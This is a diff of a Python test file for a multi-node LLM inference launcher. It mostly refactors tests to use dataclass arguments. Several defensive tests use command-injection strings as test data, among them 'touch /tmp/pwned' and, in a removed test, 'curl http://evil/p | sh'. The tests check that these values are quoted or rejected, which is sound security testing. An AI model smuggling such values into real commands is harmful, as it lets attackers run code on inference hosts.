@@ -101,11 +101,11 @@ def test_resolve_kb_topology_carries_formation_and_backend(monkeypatch, tmp_path
 
     topo = mne.resolve_kb_topology()
 
-    assert topo["nodes"] == 2
-    assert topo["gpus_per_node"] == 8
-    assert topo["tp"] == 8
-    assert topo["ep"] == 4
-    assert topo["backend"] == "infera"
+    assert topo.nodes == 2
+    assert topo.gpus_per_node == 8
+    assert topo.tp == 8
+    assert topo.ep == 4
+    assert topo.backend == "infera"
 
 
 def _kb_env(monkeypatch, tmp_path, **env):
@@ -134,8 +134,8 @@ def test_resolve_kb_topology_carries_the_partition_mode_into_the_key(monkeypatch
 
     topo = mne.resolve_kb_topology()
 
-    assert topo["partition_mode"] == "CPX"
-    assert kb_hardware_slug("MI300X", **topo) == "MI300X_cpx"
+    assert topo.partition_mode == "CPX"
+    assert kb_hardware_slug("MI300X", topo) == "MI300X_cpx"
 
 
 def test_resolve_kb_topology_prefers_persisted_partition_mode_on_resume(monkeypatch, tmp_path):
@@ -143,7 +143,7 @@ def test_resolve_kb_topology_prefers_persisted_partition_mode_on_resume(monkeypa
     _kb_env(monkeypatch, tmp_path, HYPERLOOM_PARTITION_MODE="SPX")
     monkeypatch.setattr(mne, "_read_state", lambda: {"compute_partition": {"mode": "cpx"}})
 
-    assert mne.resolve_kb_topology()["partition_mode"] == "CPX"
+    assert mne.resolve_kb_topology().partition_mode == "CPX"
 
 
 def test_resolve_kb_topology_leaves_the_partition_mode_unset_when_nobody_published_one(monkeypatch, tmp_path):
@@ -155,8 +155,8 @@ def test_resolve_kb_topology_leaves_the_partition_mode_unset_when_nobody_publish
 
     topo = mne.resolve_kb_topology()
 
-    assert topo["partition_mode"] == ""
-    assert kb_hardware_slug("MI300X", **topo) == "MI300X"
+    assert topo.partition_mode == ""
+    assert kb_hardware_slug("MI300X", topo) == "MI300X"
 
 
 def test_resolve_kb_topology_prefers_env_over_state(monkeypatch, tmp_path):
@@ -166,8 +166,8 @@ def test_resolve_kb_topology_prefers_env_over_state(monkeypatch, tmp_path):
 
     topo = mne.resolve_kb_topology()
 
-    assert topo["tp"] == 8
-    assert topo["ep"] == 4
+    assert topo.tp == 8
+    assert topo.ep == 4
 
 
 def test_resolve_kb_topology_falls_back_to_state_on_unparsable_env(monkeypatch, tmp_path):
@@ -177,8 +177,8 @@ def test_resolve_kb_topology_falls_back_to_state_on_unparsable_env(monkeypatch, 
 
     topo = mne.resolve_kb_topology()
 
-    assert topo["tp"] == 4
-    assert topo["ep"] == 8
+    assert topo.tp == 4
+    assert topo.ep == 8
 
 
 def test_resolve_kb_topology_leaves_tp_unspecified_rather_than_inventing_one(monkeypatch, tmp_path):
@@ -190,9 +190,9 @@ def test_resolve_kb_topology_leaves_tp_unspecified_rather_than_inventing_one(mon
 
     topo = mne.resolve_kb_topology()
 
-    assert topo["tp"] == 0
-    assert topo["ep"] == 0
-    assert "_tp" not in kb_hardware_slug("MI300X", **topo)
+    assert topo.tp == 0
+    assert topo.ep == 0
+    assert "_tp" not in kb_hardware_slug("MI300X", topo)
 
 
 def test_resolve_kb_topology_backend_matches_the_handoff_routing(monkeypatch, tmp_path):
@@ -208,7 +208,7 @@ def test_resolve_kb_topology_backend_matches_the_handoff_routing(monkeypatch, tm
         monkeypatch.delenv(f"HYPERLOOM_MN_EXT_{var}", raising=False)
 
     assert ext.build_external_state_from_env()["backend"] == "rayjob"
-    assert mne.resolve_kb_topology()["backend"] == "rayjob"
+    assert mne.resolve_kb_topology().backend == "rayjob"
 
 
 def _pd_legs_probe(lm, monkeypatch, *, healthy: set[str], log_dir: str | None = None):
@@ -678,14 +678,10 @@ def test_pd_decode_dist_init_port_derives_from_prefill():
 
 def test_build_sglang_cmd_head_has_host_port():
     lm = _load_script_module("lm_test_sglang_head", "launch_multinode.py")
-    cmd = lm._build_sglang_cmd(
-        model="/m",
-        tp=2,
-        nnodes=2,
-        node_rank=0,
-        dist_init_addr="10.0.0.1:5000",
-        extra_args=["--x"],
+    group = lm._ServerGroup(
+        framework="sglang", model="/m", tp=2, nnodes=2, head_ip="10.0.0.1", dist_init_port=5000, extra_args=["--x"]
     )
+    cmd = lm._build_sglang_cmd(group, 0)
     assert "--host" in cmd and "--port" in cmd
     assert cmd[cmd.index("--port") + 1] == "8888"
     assert "--x" in cmd
@@ -693,14 +689,10 @@ def test_build_sglang_cmd_head_has_host_port():
 
 def test_build_sglang_cmd_worker_omits_http_bind():
     lm = _load_script_module("lm_test_sglang_worker", "launch_multinode.py")
-    cmd = lm._build_sglang_cmd(
-        model="/m",
-        tp=2,
-        nnodes=2,
-        node_rank=1,
-        dist_init_addr="10.0.0.1:5000",
-        extra_args=[],
+    group = lm._ServerGroup(
+        framework="sglang", model="/m", tp=2, nnodes=2, head_ip="10.0.0.1", dist_init_port=5000, extra_args=[]
     )
+    cmd = lm._build_sglang_cmd(group, 1)
     assert "--host" not in cmd
     assert "--port" not in cmd
 
@@ -725,10 +717,7 @@ def test_build_vllm_cmd_kv_transfer_config_escapes_quotes():
         model="/m",
         tp=8,
         extra_args=[],
-        pd_role="prefill",
-        pd_transfer_backend=connector,
-        pd_kv_rank=0,
-        pd_kv_parallel_size=2,
+        pd=lm._PdRole(role="prefill", transfer_backend=connector, kv_rank=0, kv_parallel_size=2),
     )
     cfg = _kv_transfer_config(cmd)
     assert cfg["kv_connector"] == connector
@@ -747,8 +736,8 @@ def test_build_vllm_cmd_kv_transfer_config_escapes_quotes():
 
 def test_build_vllm_cmd_kv_transfer_config_defaults_and_roles():
     lm = _load_script_module("lm_test_vllm_kv_roles", "launch_multinode.py")
-    prefill = lm._build_vllm_cmd(model="/m", tp=8, extra_args=[], pd_role="prefill")
-    decode = lm._build_vllm_cmd(model="/m", tp=8, extra_args=[], pd_role="decode")
+    prefill = lm._build_vllm_cmd(model="/m", tp=8, extra_args=[], pd=lm._PdRole(role="prefill"))
+    decode = lm._build_vllm_cmd(model="/m", tp=8, extra_args=[], pd=lm._PdRole(role="decode"))
     pcfg = _kv_transfer_config(prefill)
     dcfg = _kv_transfer_config(decode)
     assert pcfg["kv_connector"] == "NixlConnector"
@@ -901,18 +890,10 @@ def test_spawn_remote_vllm_worker_writes_sentinel_pid(tmp_path):
     lm = _load_script_module("lm_test_spawn_vllm", "launch_multinode.py")
     pid_dir = tmp_path / "p"
     log_dir = tmp_path / "l"
-    rc = lm._spawn_remote(
-        framework="vllm",
-        model="/m",
-        tp=8,
-        nnodes=2,
-        node_rank=1,
-        head_ip="127.0.0.1",
-        dist_init_port=5000,
-        pid_dir=str(pid_dir),
-        log_dir=str(log_dir),
-        extra_args=[],
+    group = lm._ServerGroup(
+        framework="vllm", model="/m", tp=8, nnodes=2, head_ip="127.0.0.1", dist_init_port=5000, extra_args=[]
     )
+    rc = lm._spawn_remote(group, 1, lm._LaunchDirs(pid_dir=str(pid_dir), log_dir=str(log_dir)))
     assert rc == 0
     assert (pid_dir / "rank_1.pid").read_text(encoding="utf-8") == "0"
 
@@ -960,23 +941,6 @@ def test_wait_health_false_on_timeout(monkeypatch):
     assert lm._wait_health(timeout_s=5) is False
 
 
-def test_infera_ssh_port_role_stride_and_idle_entrypoint():
-    from hyperloom.inference_optimizer.multi_node._internal import infera_support
-    from hyperloom.inference_optimizer.multi_node._internal.ssh_client import DEFAULT_SSH_PORT
-
-    assert infera_support.ssh_port_for_pod("prefill", 0) == DEFAULT_SSH_PORT
-    assert infera_support.ssh_port_for_pod("decode", 0) == DEFAULT_SSH_PORT + infera_support.INFERA_SSH_PORT_ROLE_STRIDE
-    assert infera_support.ssh_port_for_pod("prefill", 0, ssh_port_base=2222) == 2222
-    assert infera_support.ssh_port_for_pod("decode", 0, ssh_port_base=2222) == 2232
-    assert infera_support.ssh_port_for_pod("worker", 1, ssh_port_base=2222) == 2223
-    prefill_ep = infera_support.idle_worker_entrypoint(role="prefill", ssh_port_base=2222)
-    decode_ep = infera_support.idle_worker_entrypoint(role="decode", ssh_port_base=2222)
-    assert "2222" in prefill_ep and "LWS_WORKER_INDEX" in prefill_ep
-    assert "2232" in decode_ep
-    default_prefill_ep = infera_support.idle_worker_entrypoint(role="prefill")
-    assert str(DEFAULT_SSH_PORT) in default_prefill_ep
-
-
 def test_infera_disagg_flags_and_launch_args():
     from hyperloom.inference_optimizer.multi_node._internal import infera_support
 
@@ -987,12 +951,9 @@ def test_infera_disagg_flags_and_launch_args():
     assert infera_support.disagg_flags("bogus", "nixl") == ""
 
     la = infera_support.build_node_launch_args(
-        framework="sglang",
-        model="/m",
-        tp=8,
-        nnodes=1,
-        disagg_mode="decode",
-        kv_transfer_backend="nixl",
+        infera_support.NodeLaunch(
+            framework="sglang", model="/m", tp=8, nnodes=1, disagg_mode="decode", kv_transfer_backend="nixl"
+        )
     )
     assert "--extra-args" in la and "decode" in la
 
@@ -1004,12 +965,9 @@ def test_infera_build_node_launch_args_sglang_and_kill_only():
     from hyperloom.inference_optimizer.multi_node._internal import infera_support
 
     a = infera_support.build_node_launch_args(
-        framework="sglang",
-        model="/m/x",
-        tp=16,
-        nnodes=2,
-        ep=16,
-        extra_args="--mem-fraction-static 0.7",
+        infera_support.NodeLaunch(
+            framework="sglang", model="/m/x", tp=16, nnodes=2, ep=16, extra_args="--mem-fraction-static 0.7"
+        )
     )
     assert "--framework sglang" in a
     assert "--tp 16" in a and "--nnodes 2" in a and "--ep 16" in a
@@ -1017,18 +975,12 @@ def test_infera_build_node_launch_args_sglang_and_kill_only():
     assert "--node-rank" not in a
     assert "--extra-args" in a and "0.7" in a
 
-    k = infera_support.build_node_launch_args(
-        framework="vllm",
-        model="",
-        tp=0,
-        nnodes=2,
-        kill_only=True,
-    )
+    k = infera_support.build_node_kill_args("vllm")
     assert "--kill-only" in k and "--framework vllm" in k
     assert "--model" not in k
 
 
-# Infera kernel ops routing/isolation (apply-patch / kernel-bench / install-geak).
+# Infera kernel ops routing/isolation (apply-patch / install-geak).
 
 
 def test_resolve_geak_src_resolution_order(monkeypatch):
@@ -1076,33 +1028,6 @@ def test_apply_patch_routes_to_infera_only_when_backend_infera(tmp_path, monkeyp
     assert mn_cli.cmd_apply_patch(ns) == mn_cli.EXIT_CONFIG_ERROR  # legacy path
 
 
-def test_kernel_bench_routes_to_infera_only_when_backend_infera(tmp_path, monkeypatch):
-    from hyperloom.inference_optimizer.multi_node import cli as mn_cli
-
-    sp = tmp_path / "s.json"
-    sp.write_text('{"backend":"infera","nodes":2}', encoding="utf-8")
-    sp.chmod(0o600)
-    monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(sp))
-    monkeypatch.setattr(mn_cli, "_infera_kernel_bench", lambda a: 7777)
-
-    ns = argparse.Namespace(
-        workspace="/w",
-        bench_command="true",
-        files_b64_json="{}",
-        result_glob="*.json",
-        timeout_sec=60,
-        print_logs=False,
-        poll_interval=6,
-        poll_timeout=110,
-    )
-    sp.write_text('{"backend":"infera","nodes":2}', encoding="utf-8")
-    sp.chmod(0o600)
-    assert mn_cli.cmd_kernel_bench(ns) == 7777
-    sp.write_text('{"backend":"rayjob","nodes":2}', encoding="utf-8")
-    sp.chmod(0o600)
-    assert mn_cli.cmd_kernel_bench(ns) == mn_cli.EXIT_CONFIG_ERROR
-
-
 def test_install_geak_best_effort_noop_for_rayjob(tmp_path, monkeypatch):
     # The provisioner hook must be a no-op (0) for non-infera backends.
     from hyperloom.inference_optimizer.multi_node import cli as mn_cli
@@ -1114,6 +1039,44 @@ def test_install_geak_best_effort_noop_for_rayjob(tmp_path, monkeypatch):
     assert mn_cli.install_geak_on_pods_best_effort() == 0
 
 
+def test_install_geak_propagates_install_failure(monkeypatch):
+    from hyperloom.inference_optimizer.multi_node import cli as mn_cli
+
+    def install_fails(_ns):
+        raise RuntimeError("install-geak failed")
+
+    monkeypatch.setattr(mn_cli, "_load_state", lambda: {"backend": "infera"})
+    monkeypatch.setattr(mn_cli, "cmd_install_geak", install_fails)
+
+    with pytest.raises(RuntimeError, match="^install-geak failed$"):
+        mn_cli.install_geak_on_pods_best_effort()
+
+
+def test_kill_inference_for_kernel_agent_warns_on_a_command_failure(monkeypatch, capsys):
+    from hyperloom.inference_optimizer.multi_node import cli as mn_cli
+
+    def kill_fails(_ns):
+        raise RuntimeError("kill-inference failed")
+
+    monkeypatch.setattr(mn_cli, "cmd_kill_inference", kill_fails)
+
+    assert mn_cli.kill_inference_for_kernel_agent_best_effort() is None
+    err = capsys.readouterr().err
+    assert re.fullmatch(r"\[[^\]]+\] WARN kill-inference skipped: RuntimeError: kill-inference failed\n", err)
+
+
+def test_kill_inference_for_kernel_agent_propagates_an_unexpected_error(monkeypatch):
+    from hyperloom.inference_optimizer.multi_node import cli as mn_cli
+
+    def kill_has_a_bug(_ns):
+        raise KeyError("pid_file")
+
+    monkeypatch.setattr(mn_cli, "cmd_kill_inference", kill_has_a_bug)
+
+    with pytest.raises(KeyError, match="pid_file"):
+        mn_cli.kill_inference_for_kernel_agent_best_effort()
+
+
 def test_install_geak_noop_for_rayjob(tmp_path, monkeypatch):
     # GEAK SSH install is Infera-only; RayJob kernel-agent uses the Ray runtime.
     from hyperloom.inference_optimizer.multi_node import cli as mn_cli
@@ -1123,6 +1086,42 @@ def test_install_geak_noop_for_rayjob(tmp_path, monkeypatch):
     sp.chmod(0o600)
     monkeypatch.setenv("MULTI_NODE_STATE_FILE", str(sp))
     assert mn_cli.install_geak_on_pods_best_effort() == 0
+
+
+@pytest.mark.parametrize(("raw", "expected"), [(None, 42), (" ", 42), ("0", 1), ("1800", 1800)])
+def test_poll_timeout_is_the_env_value_floored_at_one_else_the_callers_default(monkeypatch, raw, expected):
+    from hyperloom.inference_optimizer.multi_node import cli as mn_cli
+
+    monkeypatch.delenv("HYPERLOOM_MN_POLL_TIMEOUT_S", raising=False)
+    if raw is not None:
+        monkeypatch.setenv("HYPERLOOM_MN_POLL_TIMEOUT_S", raw)
+
+    assert mn_cli.resolve_poll_timeout_s(42) == expected
+
+
+def test_a_malformed_poll_timeout_is_a_config_error_not_a_retry(monkeypatch, capsys):
+    """Re-running the subcommand cannot fix a typo, and the typo must not quietly become the default budget."""
+    from hyperloom.common.env import EnvValueError
+    from hyperloom.inference_optimizer.multi_node import cli as mn_cli
+
+    class _Dashboard:
+        def __enter__(self):
+            return self
+
+        def __exit__(self, *_exc):
+            return False
+
+        def submit_job(self, _entrypoint):
+            return "sub-1"
+
+    monkeypatch.setenv("HYPERLOOM_MN_POLL_TIMEOUT_S", "30m")
+    monkeypatch.setattr(mn_cli, "_require_state", lambda *_keys: {"head_pod_ip": "10.0.0.1"})
+    monkeypatch.setattr(mn_cli, "_ray_dashboard_client", lambda _state=None: _Dashboard())
+
+    with pytest.raises(EnvValueError, match="HYPERLOOM_MN_POLL_TIMEOUT_S"):
+        mn_cli.resolve_poll_timeout_s()
+    assert mn_cli.main(["verify"]) == mn_cli.EXIT_CONFIG_ERROR
+    assert "HYPERLOOM_MN_POLL_TIMEOUT_S='30m' is not an integer" in capsys.readouterr().err
 
 
 # infera_ssh_env_from_state isolation tests (kernel-agent GEAK SSH placement).
@@ -1348,7 +1347,7 @@ def test_multinode_entrypoint_shlex_quotes_malicious_value():
     from hyperloom.inference_optimizer.multi_node import cli as mn_cli
 
     evil = "k'; touch /tmp/pwned #"
-    ep = mn_cli._build_multinode_apply_patch_entrypoint("/t/x", "QUJD", "/bak", evil, 60)
+    ep = mn_cli._build_multinode_apply_patch_entrypoint(mn_cli.KernelPatchApply("/t/x", "QUJD", "/bak", evil), 60)
     # The value is carried, but only as a single shlex-quoted token.
     assert shlex.quote(evil) in ep
     # The raw ``--kernel-id k'; touch ...`` (unquoted) form must NOT appear.
@@ -1434,11 +1433,9 @@ def test_infera_build_node_launch_args_neutralizes_malicious_extra_args():
     from hyperloom.inference_optimizer.multi_node._internal import infera_support
 
     la = infera_support.build_node_launch_args(
-        framework="sglang",
-        model="/m",
-        tp=8,
-        nnodes=1,
-        extra_args="--foo 1; touch /tmp/pwned",
+        infera_support.NodeLaunch(
+            framework="sglang", model="/m", tp=8, nnodes=1, extra_args="--foo 1; touch /tmp/pwned"
+        )
     )
     assert "1; touch /tmp/pwned" not in la
     assert "'1;'" in la
@@ -1450,33 +1447,8 @@ def test_infera_build_node_launch_args_rejects_denied_extra_args():
 
     with pytest.raises(ServerArgsRejected, match="denied server flags"):
         infera_support.build_node_launch_args(
-            framework="sglang",
-            model="/m",
-            tp=8,
-            nnodes=1,
-            extra_args="--model-path /evil",
+            infera_support.NodeLaunch(framework="sglang", model="/m", tp=8, nnodes=1, extra_args="--model-path /evil")
         )
-
-
-def test_multinode_op_args_shlex_quotes_malicious_value():
-    """The Infera SSH op_args builder path (bench) must also shlex-quote."""
-    import shlex
-
-    from hyperloom.inference_optimizer.multi_node import cli as mn_cli
-
-    evil = "x; curl http://evil/p | sh"
-    ns = argparse.Namespace(
-        workspace="/w",
-        bench_command=evil,
-        files_b64_json="{}",
-        result_glob="*.json",
-        timeout_sec=60,
-    )
-    ep = mn_cli._build_multinode_kernel_bench_entrypoint(
-        ns.workspace, ns.bench_command, ns.files_b64_json, ns.result_glob, ns.timeout_sec
-    )
-    assert shlex.quote(evil) in ep
-    assert f"--bench-command {evil}" not in ep
 
 
 def _bootstrap_sh() -> Path:
@@ -1702,7 +1674,7 @@ def test_ray_patch_siblings_reach_isolated_actor_through_runtime_env(tmp_path, a
     )
     encoded = base64.b64encode(b"value = 2\n").decode()
     entrypoint = mn_cli._build_multinode_apply_patch_entrypoint(
-        str(target), encoded, str(backup), "gemm", 20, str(jit / "build")
+        mn_cli.KernelPatchApply(str(target), encoded, str(backup), "gemm", str(jit / "build")), 20
     )
     script = _stage_ray_patch_entrypoint(entrypoint, tmp_path / "shipped")
     applied, log = _run_isolated_pod(
